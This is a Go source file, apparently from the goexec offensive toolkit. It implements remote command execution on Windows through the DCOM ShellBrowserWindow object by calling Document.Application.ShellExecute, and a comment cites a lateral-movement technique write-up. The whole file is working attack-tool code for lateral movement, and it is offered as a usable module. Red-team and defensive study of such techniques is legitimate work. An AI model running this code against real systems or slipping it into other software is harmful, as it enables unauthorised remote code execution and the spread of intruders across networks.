package dcomexec

import (
  "context"
  "fmt"

  "github.com/FalconOpsLLC/goexec/pkg/goexec"
  "github.com/oiweiwei/go-msrpc/midl/uuid"
  "github.com/rs/zerolog"

  _ "github.com/oiweiwei/go-msrpc/msrpc/erref/hresult"
  _ "github.com/oiweiwei/go-msrpc/msrpc/erref/ntstatus"
  _ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"
)

const (
  MethodShellBrowserWindow = "ShellBrowserWindow" // ShellBrowserWindow::Document.Application.ShellExecute
  ShellBrowserWindowUuid   = "C08AFD90-F2A1-11D1-8455-00A0C91F3880"
)

type DcomShellBrowserWindow struct {
  Dispatch
  WorkingDirectory string
  WindowState      string
}

// Init will initialize the ShellBrowserWindow instance
func (m *DcomShellBrowserWindow) Init(ctx context.Context) (err error) {
  if err = m.Dcom.Init(ctx); err == nil {
    return m.getDispatch(ctx, uuid.MustParse(ShellBrowserWindowUuid))
  }
  return
}

// Execute will perform command execution via the ShellBrowserWindow object. See https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/
func (m *DcomShellBrowserWindow) Execute(ctx context.Context, execIO *goexec.ExecutionIO) (err error) {
  method := "Document.Application.ShellExecute"
  cmdline := execIO.CommandLine()

  // Arguments must be passed in reverse order
  if _, err := m.callComMethod(ctx, nil, method,
    stringToVariant(m.WindowState),
    stringToVariant(""), // FUTURE?
    stringToVariant(m.WorkingDirectory),
    stringToVariant(cmdline[1]),
    stringToVariant(cmdline[0])); err != nil {

    return fmt.Errorf("call %q: %w", method, err)
  }
  zerolog.Ctx(ctx).Info().Msg("Method call successful")
  return
}
